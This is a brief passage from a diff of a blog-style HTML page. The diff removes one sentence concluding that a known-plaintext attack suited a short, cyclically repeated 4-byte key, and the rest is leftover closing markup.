class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>The analysis confirms the Known Plaintext Attack was the correct
-approach, as the key length was short (4 bytes) and applied
-cyclically.</p>
 
       
     </div>
